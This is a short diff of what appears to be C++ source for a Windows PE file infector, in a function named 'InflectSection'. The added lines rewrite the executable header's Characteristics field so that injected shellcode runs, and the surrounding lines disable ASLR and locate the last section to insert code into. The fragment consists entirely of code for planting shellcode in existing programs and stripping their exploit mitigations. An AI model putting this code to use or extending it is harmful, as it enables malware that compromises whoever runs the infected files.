@@ -66,6 +66,9 @@ bool InflectSection(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, DW
     // Disable ASLR
     pNtHeader->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
 
+    // Modify to make below shellcode work correctly
+    pNtHeader->FileHeader.Characteristics = 0x010F;
+
     // Insert code into last section
     PIMAGE_SECTION_HEADER firstSection = IMAGE_FIRST_SECTION(pNtHeader);
     PIMAGE_SECTION_HEADER lastSection = firstSection + (pNtHeader->FileHeader.NumberOfSections - 1);
